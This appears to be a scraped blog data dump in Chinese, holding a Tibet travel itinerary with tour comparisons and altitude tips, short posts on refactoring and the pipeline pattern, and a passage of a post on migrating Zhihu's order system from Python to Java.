准备做核酸检测 10-1 五 0 北京准备 理短发 10-2 六 1 北京 -&gt; 正定 待定西藏航空 TV9980 正定 T2 18:25 -&gt; 贡嘎 T3 22:45 9-18 买票洗澡洗头 10-3 日 2 10-4 一 3 10-5 二 4 洗头 10-6 三 5 10-7 四 6 10-8 五（假） 7 洗头 10-9 六（假） 8 10-10 日 9 10-11 一（假） 10 西藏航空 TV9927 贡嘎 T3 12:25 -&gt; 滨海T2 17:55天津 -&gt; 北京 待定 9-27 买票回京洗头 吃喝计划 地点 推荐菜品 费用&#x2F;注意事项 拉萨 酥油茶 糌粑 藏式白肠 藏香猪 鲁朗石锅鸡 玩乐计划景点分布图 景点明细 景点 地点 海拔 图片 备注 那根拉山口 当雄县境内，是通往纳木错的必经之地，也是藏民心中的神圣之地。 海拔达5190米 圣象天门 那曲地区班戈县青龙乡5村境内 ，圣湖纳木措北部恰多朗卡岛上。 4800米 日落星空银河宿青龙小镇 纳木错 位于西藏自治区中部，是西藏第二大湖泊，也是中国第三大的咸水湖。 湖面海拔4718米 藏北草原 念青唐古拉山口 ？？ 羊八井温泉 拉萨市西北91.8公里的当雄县境内 海拔4231米 途径 尼木县 居雅鲁藏布江中游北岸，地势是北高南低，尼木河两岸为代表的河谷地区，地势平坦。 海拔: 3818米 日喀则 日喀则市区海拔3836米，市区海拔要比拉萨高。 宿 嘉措拉山口 5248 待一小时 定日 日喀则市 驻地协格尔海拔4300米。平均海拔5000米。 珠峰大本营 5200 看星空日落 加乌拉山口 前往珠穆朗玛峰大本营途中的一个垭口。在世界上唯一可以观赏5座8000米级雪峰的观景平台。 海拔5210米 一眼看尽5座8km雪山 奇林峡 日喀则地区定结县，处于尼泊尔、印度边境。 5018米 大自然的奇观 扎什伦布寺 日喀则市城西的尼玛山东面山坡上 海拔高度3874米 卡若拉冰川 冰舌前沿海拔5560米，观看卡若拉冰川的地方海拔约有5400米 拉满水库 日喀则地区江孜县龙马乡境内年楚河上游 坝址区高程4200~4300米 羊卓雍措（羊湖） 湖面海拔4,441米。 日托寺 坐落在羊湖内湖深处半岛山顶的寺庙 以下七日团景点 思金拉措 墨竹工卡县日多乡东南、山南地区桑日县增期乡以北，距川藏公路（318国道）约6公里，距墨竹工卡县城66公里，距拉萨市区124公里 海拔4500米 林芝 西藏东南部，雅鲁藏布江中下游 平均海拔3100米 雅鲁藏布大峡谷 主体在墨脱县 2880米 索松村 林芝市米林县派镇下辖自然村 3012米 米林朗县 林芝市，位于朗县位于林芝市西南部 平均海拔3200米 亲猴台 达古峡谷 山南市桑日县与加查县交界处(属桑日县增期乡达古村，距桑日县县城40公里)，离泽当有80km，距离拉萨220公里 3200米 拉姆拉措 “拉姆拉措”正是被莲花捧起来的圣湖。 4000米以上 加查&#x2F;泽当 岗巴拉山 西藏山南地区浪卡子县和贡嘎县之间 4990米 推村 拉萨西南300多公里的蒙达岗日雪山脚下、普姆雍措湖畔，是世界上海拔最高的行政村落 5070米 杰岗日神山 测东拉错 色林措 申扎、班戈和尼玛3县交界处，冈底斯山北麓，申扎县以北。 湖面海拔4530m 旅游团对比 编号 A B C1 C2 D1 D2 E1 E2 F 渠道特点 微信关系5-4 国营飞猪房车团5-4 同A-国营飞猪5-4 同A-国营飞猪5-4 国营飞猪4-3 国营飞猪4-3 国营飞猪7-6 价格 3000 5000 2780 4680 2880 4780 1560-1880 2560 4180 链接 【拉萨国企】西藏拉萨旅游珠峰大本营圣象天门纳木错5天4晚五日游-旅游度假-飞猪 【拉萨国企】圣象天门珠峰大本营纳木错5天4晚五日游西藏拉萨旅游-旅游度假-飞猪 【拉萨国企】珠峰大本营羊湖纳木错圣象天门4天西藏拉萨旅游四日-旅游度假-飞猪 西藏拉萨林芝山南羊湖珠峰大本营纳木错圣象天门全景大环线7日游-旅游度假-飞猪 行程 行程特点 第一天去的海拔5000米，容易有高反。 第一天海拔4400，第二天才到 5000，舒适。 第一天去的海拔5000米，容易有高反。 * 第一天去的海拔5000米，容易有高反。* 比A多了羌塘无人区行程，都在车上。 * 第一天去的海拔5000米，容易有高反。* 自己做动车从日喀则回拉萨。* 比五天团少羊卓雍措景点。 大环线，海拔由低到高。穿越羌塘无人区。 车辆 4-5人房车团配无人机 7-17座正规旅游车 5座越野车 7-17座正规旅游车 5座越野车 7-17座正规旅游车 7-9座正规旅游车，无人机 无车辆信息 住宿 1晚圣象天门藏家民宿多人间或多人帐篷（通铺）+日喀则2晚域腾酒店或同等级别酒店+1晚珠峰营地藏家民宿（多人间）或帐篷（通铺） 日托寺、珠峰、圣象天门住房车上（房车无法洗澡），日喀则住三星或三钻酒店可洗澡，双人标间单床位价格，单人出行我们尽量拼房，如无人拼或不愿拼则需补房差。 近似A 近似A 近似A 近似A 近似A 近似A 近似A 退改规则 订单生效后，因买家原因取消订单的，费用扣除标准如下：行程开始前【7日以上】扣除20%违约金；行程开始前【4-6日】扣除30%违约金；行程开始前【1-3日】扣除50%违约金；行程开始当天扣除100%违约金。 【买家违约】订单生效后，因买家原因取消订单的，费用扣除标准如下：【商家违约】订单生效后，因商家原因取消订单的，除全额退款外，商家还应向买家支付下表对应金额的违约金：行程开始前 违约金（占订单总费用）7日以上 0%；4—6日 20%；1—3日 40%；行程开始当日 60% 同 B 同 B 同 B 同 B 同 B 同 B 同 B 提醒事项 无右侧提醒 ②.因珠峰大本营海拔较高达5200左右，所有含珠峰行程司机均会带大家前往氧气及大衣补给站点(医用型钢瓶氧气3L装约300，10L装大氧气约600左右，军大衣100左右，费用较高)，请根据自身身体是否有高反等情况自愿选择绝无强制消费，我社建议在拉萨提前自带便携社按压氧气(1L装约20左右一瓶，各大超市药店均有售，多带两个一般即可)，此氧气补给点并非购物点环节，有人需要有人不需要请理性客观对待及选择，特此告知说明。 同A 注意事项PS: 当地的风俗禁忌； 特别提示：出现高原反应的最大因素，是心里因素！心里的恐慌和压力，是造成高反的最主要原因！所以，我们应该放松心态去旅行。 严重高血压、哮喘病、心脏病这三类患者不建议进藏，一般旅行社都不接待。个别轻微症状可以先咨询医生建议。 身体健康的人都可以进藏，不需要提前做什么运动。反而，运动员进藏很容易高原反应。所以，进藏前多休息，禁剧烈运动。 可以准备一些普通药物，包括胃舒平，感冒药，头晕药等在行李上。切忌，严重感冒患者不要进藏。 西藏属于少数民族地区，人生地不熟，建议进藏前咨询好西藏当地的旅行社采取跟团游为佳。 西藏当地的银行主要是四家国有银行，中行、建行、农行、工行。农行的覆盖率最为广泛。取款的ATM机在拉萨市内有，下地区较少。 进藏前避免大量饮食，减少吸烟和喝酒。 西藏很多寺庙禁止穿短裙、短袖、戴帽子和墨镜入内的。 很多寺庙都是不允许拍照的，偏远地区的悠谢寺庙可以拍照，不过需要经过同意，不要随意对着朝圣者拍照，要拍照时必须经过别人允许。 尊重当地文化信仰，请勿在西藏谈论政治及宗教信仰。 藏民普遍都是热情好客的，未经允许不要对他们的脸拍照。请勿用手触摸藏族人的头，尤其是小朋友的。 在西藏天葬是不允许陌生人观看的，请尊重当地习俗，不要围观。 西藏很多湖都是当地的圣湖，游玩时切勿脱鞋下水。 没有高反或轻微高反不要吸氧，吸氧是有依赖性的，有明显高反头疼的可以吃抗高反药物、出现呕吐的喝葡萄糖，会有明显改善。 珠峰大本营需要提前办理边防证。 关于高反 https://www.zhihu.com/question/21451875 地理信息日出日落时间表拉萨 日期 日出 日中 日落 2021年10月01日 周五 07:48:46 13:45:02 19:41:19 2021年10月02日 周六 07:49:20 13:44:43 19:40:07 2021年10月03日 周日 07:49:54 13:44:24 19:38:55 2021年10月04日 周一 07:50:28 13:44:06 19:37:44 2021年10月05日 周二 07:51:03 13:43:48 19:36:33 2021年10月06日 周三 07:51:38 13:43:30 19:35:22 2021年10月07日 周四 07:52:13 13:43:13 19:34:12 2021年10月08日 周五 07:52:48 13:42:56 19:33:03 2021年10月09日 周六 07:53:24 13:42:39 19:31:54 2021年10月10日 周日 07:54:01 13:42:23 19:30:46 2021年10月11日 周一 07:54:37 13:42:08 19:29:38 参考：[拉萨市 2021年10月份 日出日落时刻查询 - 拉萨市日出日没时刻 - 查询拉萨市日出时间 - 查询拉萨市日落时间 (bmcx.com)](https://richurimo.bmcx.com/lasa__time__2021_10__richurimo&#x2F;) 潮汐表 日期 满潮 干潮 满潮 干潮 天气趋势（穿衣趋势）天气地图 (weather.com.cn) 气温特点拉萨气温 【拉萨天气】拉萨40天天气预报,拉萨更长预报,拉萨天气日历,拉萨日历,15天天气预报,天气预报一周 北京气温 TODO 天气变化天气多变不可琢磨 海拔信息 地点 经纬 海拔（米） 拉萨 东经91°06′，北纬29°36′ 3650 珠峰大本营 5200 那根拉山口 5190 圣象天门 4800 日喀则 3836 羊卓雍措 湖面海拔4441米 风俗特点TODO 速查表关键交通（速查） 地点 交通设施 关键距离 — — — 气温衣物对照表（速查） 天气 气温℃ 穿衣建议 酷热，很不舒适 ≥40 停止户外作业，对老弱病幼人群采取保护措施 暑热，不舒适 ≥37 避免在高稳时段进行户外活动，老弱病幼落实防暑降温保护措施。 闷热，不舒适 ≥35 天气闷热，适宜着丝麻、轻棉织物制作的短衣、短裙、薄短裙、短裤等夏季服装。午后尽量减少户外活动，高温条件下作业和露天作业人员采取必要防护措施。 炎热，不舒适 33~34.9 天气炎热，适宜着短衫、短裙、短裤、薄型T恤衫、敞领短袖棉衫等夏季服装。 热，较不舒适 28~32.9 天气较热，适宜着棉麻面料的衬衫、薄长裙、薄T恤等夏季服装。年老体弱者：长袖衬衫和单裤。 热舒适 25~27.9 天气偏热，适宜着短衫、短裙、短套装、T恤等夏季服装。年老体弱者：单层薄衫裤、薄型棉衫。 较舒适 23~24.9 天气暖和，适宜着单层棉麻面料的短套装、T恤衫、薄牛仔衫裤、休闲服、职业套装等春秋过渡装。年老体弱者请适当增减衣服。 舒适 21~22.9 天气温暖，适宜着长袖衬衫加单裤、单层薄衫裤、薄型棉衫等春秋过渡装；年老体弱者：针织长袖衬衫＋背心、长裤、薄型套装。 凉舒适 18~20.9 天气温和，适宜着 单层薄衫裤、薄型棉衫、长裤、针织长袖衫、长袖 T 恤、薄型套装、牛仔衫裤、西服套装、薄型夹克等春秋过渡装；年老体弱者宜着针织长袖衬衫 + 马甲、长裤、夹克衫、西服套装等。 温凉，较舒适 15.0~17.9 天气温凉，适宜着夹衣、马甲衬衫、长裤、夹克衫、西服套装加薄羊毛衫等春秋服装。年老体弱者：夹衣或风衣加羊毛衫。 微凉 13~14.9 天气微凉，适宜着一件羊毛衫、夹克衫、西服套装、马甲衬衫＋夹克衫配长裤等春秋着装；年老体弱者：厚外套加毛衣、呢外套加羊毛衫。 较凉 11~12.9 天气较凉，适宜着厚外套加毛衣、大衣、毛套装、西服套装等春秋服装。体弱者宜着大衣、毛衣加呢外套等厚型春秋服装。 凉 8~10.9 天气凉，适宜着一到两件羊毛衫、大衣、毛套装、皮夹克等春秋着装；年老体弱者宜着大衣、夹衣或风衣加羊毛衫等厚型春秋着装。 微冷 5~7.9 天气微冷，适宜着毛衣、风衣、大衣、皮夹克、外套、毛套装、西装、防寒服等厚型春秋着装；老年体弱者，冬季着装：一到两件羊毛衫＋大衣或毛套装、薄棉外套等。 较冷 0~4.9 天气微冷，适宜着毛衣、风衣、大衣、皮夹克、外套、毛套装、西装、防寒服等厚型春秋着装；老年体弱者，冬季着装：一到两件羊毛衫＋大衣或毛套装、薄棉外套等。 冷 -4.9~0 天气冷，冬季着装：棉衣、羽绒衣、冬大衣、皮夹克、毛衣再外罩大衣等；年老体弱者尤其要注意保暖防冻。 寒冷(风力≤4) -9.9~-5 天气寒冷，冬季着装：棉衣、羽绒服、冬大衣、皮夹克加羊毛衫、厚呢外套、呢帽、手套等；年老体弱者尽量少外出。 很冷（风力≥4） -9.9~-5 温度极低，尽量少外出；建议着厚棉衣、厚羽绒服、冬大衣、皮夹克、裘皮大衣、棉（皮）帽、棉（皮）手套、棉（皮）靴等隆冬着装。 极冷 ≤-10 温度极低，尽量少外出；建议着厚棉衣、厚羽绒服、冬大衣、皮夹克、裘皮大衣、棉（皮）帽、棉（皮）手套、棉（皮）靴等隆冬着装。 参考文章西藏旅游攻略——第一步准备篇 - 知乎 (zhihu.com) 最详细的西藏旅游攻略！（仅供参考） - 知乎 (zhihu.com)","categories":[],"tags":[{"name":"效率","slug":"效率","permalink":"https://noogel.xyz/tags/%E6%95%88%E7%8E%87/"},{"name":"游记","slug":"游记","permalink":"https://noogel.xyz/tags/%E6%B8%B8%E8%AE%B0/"}]},{"title":"软件重构的三个层次","slug":"关于技术/系统经验/软件重构的三个层次","date":"2021-08-13T00:00:00.000Z","updated":"2025-07-23T07:30:58.918Z","comments":true,"path":"2021/08/13/1.html","link":"","permalink":"https://noogel.xyz/2021/08/13/1.html","excerpt":"","text":"你有没有遇到过一个函数几百行长度，如果没有可以跳过本文章了，如果没有那么应该看看下面的内容。一个超长函数的复杂性不在于那些胶水代码，而是其中的逻辑分支，大量的逻辑分支导致你的代码难以理解。而重构的过程分为两步： 编写单元测试，如果覆盖到了函数的每个分支，那么重构的风险性就会降到最低。 重构代码，对代码进行拆分重写，为了使代码变得易于维护。 重构分为三个层次： 小重构 消除重复代码 拆分小函数（单一职责） 设计模式 GoF 23种 抽象建模 四色建模法 风暴建模法 复杂度问题的应对办法，防止偶然复杂性。 TODO","categories":[],"tags":[{"name":"重构","slug":"重构","permalink":"https://noogel.xyz/tags/%E9%87%8D%E6%9E%84/"}]},{"title":"管道模式在电商售后中的应用与优化","slug":"关于技术/系统经验/管道模式在电商售后中的应用与优化","date":"2021-08-10T00:00:00.000Z","updated":"2025-07-23T07:30:58.917Z","comments":true,"path":"2021/08/10/1.html","link":"","permalink":"https://noogel.xyz/2021/08/10/1.html","excerpt":"","text":"背景介绍首先介绍一下实体电商通用的售后流程。 用户申请：在用户申请操作时需要填写退货、换货，以及原因。 商家审核：商家会根据沟通情况审核售后申请。 用户回寄：审核通过后需要用户回寄商品。 确认退换：商家收货确认后会给用户退款或者邮寄新货。 虚拟商品的售后通用流程如下： 管理员发起退换操作 处理退换 退：先退货后退款 换：先退货后发货 在以上两个流程的处理流程有个共通的地方，就是一次操作需要涉及多个子流程的处理，这就是接下来需要讲的通用售后流程抽象。多个子流程的处理意味着要和多个子系统分别进行沟通处理退货、换货和退款。 这里就涉及到分布式系统的一致性问题了，售后模块作为资源的协调方，我们是否可以采用 TCC 的强一致性方案？答案是 No，成本有点高。普遍的做法是采用弱一致性方案保证最终一致性，我们可以考虑采用 Pipeline 机制。 概念比较Pipeline 管道模式在 Pipeline 机制中有三个基本概念： Pipeline 管道 Valve 阀门 Context 上下文数据 一个 Pipeline 管理多个 Valve，多个 Valve 共享一个 Context 数据。用类图来表达如下： 为了管理处理的进度，我们每个 Valve 都是有状态的，那么所有的状态和就是整个 Pipeline 的状态。 TCC 方案TCC 是一种补偿事务方案，他要求对每个服务提供如下三个接口： Try：尝试对业务进行一致性检查（一致性），然后对资源的锁定（隔离性）。 Confirm：如果所有的服务都锁定成功并且可执行，就进行确认资源的处理。 Cancel：如果有问题就释放资源。 它的适用场景有以下两个要求： 一致性和隔离性要求比较强 执行时间比较短的业务 举例说明是账户间转账、跨系统转账等资金类操作上。 但是它有一个比较明显的缺点就是实现成本比较高，需要协调的服务方越多，系统压力也就越大。 在售后场景中，TCC 是明显不适合的。对于整个售后流程说，各个环节也会出现资源占用导致处理失败的情况，受到 Try 的启发，我们不锁资源，只是在整个处理前挨个进行 qualification 资格检查，全部通过后再进入执行阶段。 责任链模式责任链模式，用来处理相关业务逻辑的一条执行链，执行链上有多个节点，每个节点都可以处理请求，如果某个节点处理完毕就可以根据实际业务需求传递给下一个节点继续处理或者返回处理完毕的结果。 对于责任链模式，为什么有的实现和 Pipeline 很像。有人对责任链模式进行了如下两种分类： 纯责任链：链上只有一个节点会处理请求。比如双亲委派。 不纯责任链：链上的每个节点都可以处理请求，并转发到下一个节点。比如 Spring Filter 机制。 从上面来看不纯责任链就是 Pipeline 模式，要说区别目前有如下结论。不纯责任链更偏重于数据的过滤和加工，Pipeline 模式是数据的加工，并且更突出节点的状态。 总结 对于售后事件的各个环节处理，如果其中一个环节执行失败，之前的环节怎么办，有以下几种方式来解决： 增加审核环节，对整个事件审核并预判后续环节的可行性。 状态回滚，某个环节执行失败，之前的环节都回滚。 执行前对各个环节进行资格检查。 最严格的 TCC 资源锁定，一起提交一起失败。 以上四种方式各有利弊，需要根据实际场景来判定使用。","categories":[],"tags":[{"name":"设计模式","slug":"设计模式","permalink":"https://noogel.xyz/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}]},{"title":"聊聊知乎订单系统迁移","slug":"关于技术/系统经验/聊聊知乎订单系统迁移","date":"2021-06-24T00:00:00.000Z","updated":"2025-07-23T07:30:58.918Z","comments":true,"path":"2021/06/24/1.html","link":"","permalink":"https://noogel.xyz/2021/06/24/1.html","excerpt":"","text":"本文主要介绍知乎订单系统后端语言栈的转型升级过程，包括其间踩过的一些坑和遇到的一些问题。一来是想通过本篇文章为其它应用服务转型提供借鉴经验，二来是总结对于订单系统的理解。鉴于文字功底不足，对于业务理解不充分的地方，欢迎留言交流。文章大纲如下： 迁移背景 前期准备 迁移方案 接口验证 指标梳理 可用性保障 MTTR 快速响应 MTBF 降低故障率 一致性保障 事后总结 目标回顾 执行计划 执行结果 问题整理 业务沉淀 方法论实践 参考文章 招聘信息 迁移背景随着知乎整体技术栈的变化，原有的 Python 技术栈逐渐被抛弃，新的 Go 和 Java 技术栈逐渐兴起。知乎交易系统的稳定性相比其它业务系统的稳定性重要很多，因为交易系统核心链路发生故障不仅会造成数据问题，还会造成严重的资损问题。随着公司业务的不断壮大发展，交易场景变得复杂，重构和优化难以避免，因为语言特性，Python 虽然开始撸代码很爽，但是后期的维护成本慢慢变高，不过 Python 在数据分析和人工智能方向上还是有很大优势的，只是在交易领域目前看起来不太合适。从技术生态上来说，用 Java 做交易系统会更有优势，所以接下来要说的知乎订单系统语言栈转型。另外一个因素是 Python 的 GIL 锁导致它无法发挥多核的优势，性能上受到很大限制，在实际情况中遇到过多次主线程被 hang 住导致的可用性故障，所以坚定决心来迁移掉旧系统。 前期准备 工欲善其事，必先利其器。 语言栈转型首先要明确转型的三个开发流程，即 MRO (Migration, Reconstruction, Optimization) 迁移 就是把原语言代码照着抄一遍到新语言项目上，按照新语言的工程实现风格来做就可以。其间最忌掺杂代码优化和 bug 修复，会容易引起新的问题，增加验证代码的难度。 重构 目的是提高项目代码的可维护性和可迭代性，让代码更优雅和易读懂，可以放到迁移完成来做。 优化 通过在模块依赖、调用关系、接口字段等方面的调整来降低项目的复杂性，提高合理性。 对于语言栈转型来说，迁移流程是肯定要做的，重构和优化如何选择，可以按模块划分功能拆成子任务来分别评估方案，参考依据为现有模块如果同时优化或重构带来的直接收益和间接收益有多少。 收益：完成新旧语言栈的转换，系统维护性更好，模块边界更清晰。 成本：需要投入的人力成本，迁移过程中的并行开发成本，使有更高价值的工作被阻塞的损失。 风险：引入新的 bug，增加测试的复杂性。 在风险可控的前提下，成本与收益要互相权衡，一般会有两种方案可供参考：第一种是锁定需求，堆人力开发上线，一步到位；第二种则是小步快走，迭代上线，分批交付。 基于以上分析，在本次转型过程中，人力成本是一个更重要的因素，所以采用只迁移的方案，来压缩人力成本，降低 bug 引入风险的同时也具有很好的可测试性。并且为了不阻塞业务需求，采用小步快走的方式分批交付，以最长两周作为一个迭代周期进行交付。 迁移方案确定了交付方式，下面我们需要梳理当前系统中的功能模块，做好任务拆分和排期计划。知乎交易系统在迁移前的业务是针对虚拟商品的交易场景，交易路径比较短，用户从购买到消费内容的流程如下： 在商品详情页浏览 生成订单进入收银台和用户支付 确认支付后订单交付 用户回到详情页消费内容 特定商品的七天无理由退款 当时订单系统支持的功能还不多，业务模型和订单模型没有足够地抽象，梳理订单系统业务如下： 完成了订单模块的拆分后，新老系统如何无缝切换？如何做到业务无感？如何保障交易系统稳定性？出现故障如何及时止损？基于上面讲述的原则，将整个系统的迁移划分成两个阶段，迁移前后的数据存储和模型都不变。 接口验证不论是在迁移的哪个阶段，总需要调整订单接口，可以从订单操作角度分为读操作和写操作，需要针对读接口和写接口做不同的验证方案。 写操作可以通过白名单测试以及灰度放量的方式进行验证上线，将接口未预期异常输出到 IM 工具以得到及时响应。主要的写操作相关接口有： 订单的创建接口。 订单绑定支付单的提交接口。 用户支付后回调确认接口。 用户发起退款接口。 下图展示的是 AB 平台的流量配置界面： 下图展示了部分交易预警通知消息： 读操作往往伴随在写操作中。我们利用平台的录制回放功能进行接口的一致性检查，通过对比得出差异排查问题。主要的读操作接口有： 获取支付方式列表接口 获取订单支付履约状态接口 获取充值列表接口 批量查询用户新客状态接口 下图展示的是流量录制回放系统的数据大盘： 指标梳理监控是我们系统的『第三只眼』，可以及时反应系统的健康状况，及时发出告警信息，并帮助我们在出现故障时分析问题和快速缩小排查范围。硬件、数据库、中间件的监控已经在平台层得到支持，这里只需要梳理出应用的监控指标。 日志监控：请求日志、服务端的错误日志。 订单业务指标 下单量、成单量、掉单量 单量环比数据 首次履约异常量 补偿机制履约量 各通知事件 P95 耗时 成功履约 P95 耗时 履约准时率&#x2F;成功率 支付业务指标 支付渠道履约延迟 P95 支付履约延迟 P95。 用户购买完整耗时 P95。 可用性保障在整个交付的过程中，转型前后对 SLA 要提供一致的可用性保障，可以看看下面的几个衡量标准： 一般 3 个 9 的可用性全年宕机时间约为 8.76 小时，不同系统不同用户规模对于系统可用性的要求不一样，边缘业务的要求可能会低一些，但是对于核心链路场景 TPS 可能不高，但是必须要求保证高可用级别。如何保证或者提升服务的 SLA 是我们接下来要探讨的内容，一般有下面两个影响因素： MTBF (Mean Time Between Failures) 系统服务平均故障时间间隔 MTTR (Mean Time To Recover) 系统服务平均故障恢复时长 也就是说我们要尽可能地降低故障频率，并确保出现故障后可以快速恢复。基于这两点我们在做系统平稳过渡时，要充分测试所有 case ，并且进行灰度方案和流量录制回放，发现异常立即回滚，定位问题解决后再重新灰度。 MTTR 快速响应持续监控 感知系统稳定性的第一步就是监控，通过监控来反映系统的健康状况以及辅助定位问题，监控有两个方向： 第一个方向是指标型监控，这里监控是在系统代码中安排各种实时打点，上报数据后通过配置报表呈现出来的。 基础设施提供的机器监控以及接口粒度的响应稳定性监控。 物理资源监控，如 CPU、硬盘、内存、网络 IO 等。 中间件监控，消息队列、缓存、Nginx 等。 服务接口，HTTP、RPC 接口等。 数据库监控，连接数、QPS、TPS、缓存命中率、主从延迟等。 业务数据层面的多维度监控，从客户端和服务端两个角度来划分。 从客户端角度来监控服务端的接口成功率，支付成功率等维度。 从服务端角度从单量突变、环比变化、交易各阶段耗时等维度持续监控。 以上两点基于公司的 statsd 组件进行业务打点，通过配置 Grafana 监控大盘实时展示系统的健康状况。 第二个方向是日志型监控，这主要依赖公司的 ELK 日志分析平台和 Sentry 异常捕获平台。通过 Sentry 平台可以及时发现系统告警日志和新发生的异常，便于快速定位异常代码的发生位置。ELK 平台则可以将关键的日志详细记录下来以便于分析产生的场景和复现问题，用来辅助修复问题。 异常告警 基于以上实时监控数据配置异常告警指标，能够提前预知故障风险，并及时发出告警信息。然而达到什么阈值需要告警？对应的故障等级是多少呢？ 首先我们要在交易的黄金链路上制定比较严格的告警指标，从下单、提单、确认支付到履约发货的每个环节做好配置，配置的严重程度依次递增分为 Info、Warning、Critical。按照人员类别和通知手段来举例说明告警渠道： IM 中的预警消息截图如下： 订单主要预警点如下： 核心接口异常 掉单率、成单率突变 交易各阶段耗时增加 用户支付后履约耗时增加 下单成功率过低 MTBF 降低故障率系统监控告警以及日志系统可以帮我们快速的发现和定位问题，以及时止损。接下来说的质量提升则可以帮助我们降低故障发生率以避免损失，主要从两个方向来说明： 规范化的验收方案 ① 开发完成包括逻辑功能和单元测试，优先保证单测行数覆盖率再去保证分支覆盖率。然后在联调测试环境中自测，通过后向 QA 同学提测。② QA 同学可以在测试环境下同时进行功能验收和接口测试，测试通过后便部署到 Staging 环境。③ 在 Staging 环境下进行功能验收并通过。④ 灰度交付以及双读验证可以根据实际情况选择性使用。⑤ 上线后需要最后进行回归测试。 统一的编码规约以及多轮 CR 保障 代码上线前一般至少要经过两次代码评审，太小的 MR 直接拉一位同事在工位 CR 即可，超过百行的变更需要拉会研讨，两次评审的关注点也不同。 第一次评审应关注编码风格，这样可以避免一些因在写法上自由发挥而带来的坑，以此来沉淀出组内相对统一的编码规约，在编码的稳定性上建立基本的共识，提升代码质量。 第二次评审应关注代码逻辑，这里有个需要注意的点是，如果明确只做迁移，那么其间发现旧逻辑难理解的地方不要随便优化，因为在不了解背景的情况下很有可能会写一个 bug 带上线（这种事见过好几次）。另外这样也好去对比验证，验证通过上线后再去优化。 只有通过明确目的和流程并且遵循这个流程做，才能更快更好地交付有质量的代码。 一致性保障每一个微服务都有自己的数据库，微服务内部的数据一致性由数据库事务来保障，Java 中采用 Spring 的 @Transtaction 注解可以很方便地实现。 而跨微服务的分布式事务，像 支付、订单、会员三个微服务之间采用最终一致性，类似 TCC 模式的两阶段提交，订单通过全局发号器生成订单 ID，然后基于订单 ID 创建支付单，如果用户支付后订单会变更自身状态后通知会员微服务，履约成功则事务结束，履约失败则触发退款，如果用户未支付，那么订单系统将该订单以及支付单做关单处理。 对应一致性保障，我们对订单接口做了两个方面的处理： 分布式锁 对于上游的支付消息监听、支付 HTTP 回调、订单主动查询支付结果三个同步机制分别基于订单 ID 加锁后再处理，保证同步机制不会被并发处理。 接口幂等 加锁后对订单状态做了检查，处理过则响应成功，否则处理后响应成功，保证上游消息不会被重复处理。 订单对于下游的履约，是通过订单 ID 作为幂等 key 来实现的，以保证同一个订单不会被重复履约，并且通过 ACK 机制保证履约后不会再重复调到下游。 其中分布式锁采用 etcd 锁，通过锁租约续期机制以及数据库唯一索引来进一步保障数据的一致性。 补偿模式，虽然我们通过多种手段来保证了系统最终一致，但是分布式环境下会有诸多的因素，如网络抖动、磁盘 IO、数据库异常等都可能导致我们的处理中断。这时我们有两种补偿机制来恢复我们的处理： 带惩罚机制的延时重试 如果通知中断，或者未收到下游的 ACK 响应，则可以将任务放到延迟队列进行有限次的重试，重试间隔逐次递增。最后一次处理失败报警人工处理。 定时任务兜底 为了防止以上机制都失效，我们的兜底方案是定时扫描异常中断的订单再进行处理。如果处理依然失败则报警人工处理。 事后总结目标回顾目标一：统一技术栈，降低项目维护成本。目标结果是下线旧订单系统。目标二：简化下单流程，降低端接入成本。目标结果是后端统一接口，端上整合 SDK。 执行计划迁移的执行总共分成了三个大阶段： 第一阶段是迁移逻辑，即将客户端发起的 HTTP 请求转发到 RPC 接口，再由新系统执行。第一阶段做到所有的新功能需求都在新系统上开发，旧系统只需要日常维护。 第二阶段是通过和客户端同学合作，迁移并整合当前知乎所有下单场景，提供统一的下单购买接口，同时客户端也统一提供交易 SDK，新组件相对更加稳定和可监控，在经过灰度放量后于去年底完全上线。第二阶段做到了接口层的统一，更利于系统的维护和稳定，随着新版的发布，旧接口流量已经变得很低，大大降低了下阶段迁移的风险。 第三阶段是旧 HTTP 接口迁移，由新系统承载所有端的请求，提供相同规格的 HTTP 接口，最后通过修改 NGINX 配置完成接口迁移。第三阶段迁移完成后旧系统最终实现了下线。 执行结果截至此文撰写时间，语言栈已经 100% 迁移到新的系统上，旧系统已经完全下线，总计下线 12 个系统服务， 32 个对外 HTTP 接口，21 个 RPC 接口，15 个后台 HTTP 接口。 根据 halo 指标，迁移前后接口 P95 耗时平均减少约 40%，硬件资源消耗减少约 20%。根据压测结果比较，迁移后支撑的业务容量增长约 10 倍。 系统迁移完成只是取得了阶段性的胜利，接下来系统还需要经过一些小手术来消除病灶，主要是以下几点： 不断细化监控粒度，优化告警配置，继续提高服务的稳定性。 对于 Python 的硬翻译还需要不断重构和优化，这里借鉴 DDD 设计思想。 完善监控大盘，通过数据驱动来运营优化我们的流程。 项目复盘总结以及业务普及宣讲，提升人员对于业务细节的认知。 问题整理迁移总是不能一帆风顺的，其间遇到了很多奇奇怪怪的问题，为此头发是真没少掉。 问题 1：迁移了一半新需求来了，又没有人力补上来怎么办？ 迁移后再做重构和优化过程，其实很大一部分考量是因为人力不足啊，而且现状也不允许锁定需求。那么只能写两遍了，优先支持需求，后面再迁移。如果人力充足可以选择一个小组维护新的系统一个小组维护旧的系统。 问题 2：我明明请求了，可日志怎么就是不出来呢？ 不要怀疑平台的问题，要先从自身找问题。总结两个原因吧，一个是新旧系统的迁移点太分散导致灰度不好控制，另一个是灰度开关忘记操作了，导致流量没有成功导到新系统上。这里要注意一个点就是在迁移过程中要尽可能的快速交付上线。 问题 3：公司 Java 基础服务不够完善，很多基础平台没有支持怎么办? 于是自研了分布式延迟队列、分布式定时任务等组件，这里就不展开聊了。 问题 4：如何保证迁移过程中两个系统数据的一致性？ 首先我们前面讲到的是系统代码迁移，而数据存储不变，也就是说两个系统处理的数据会存在竞争，解决的办法是在处理时加上分布式锁，同时接口的处理也是要幂等的。这样即使在上下游系统做数据同步的时候也能避免竞争，保证数据的一致性。就用户支付后支付结果同步到订单系统这一机制来说，采用推拉的机制。① 用户支付后订单主动轮询支付结果，则是在主动拉取数据。② 支付系统发出 MQ 消息被订单系统监听到，这是被动推送。③ 支付成功后触发的订单系统 HTTP 回调机制，这也是被动推送。以上三种机制结合使用使得我们系统数据一致性有一个比较高的保障。我们要知道，一个系统绝非 100% 可靠，作为交易支付的核心链路，需要有多条机制保证数据的一致性。 问题 5：用户支付后没有收到会员权益是怎么回事？ 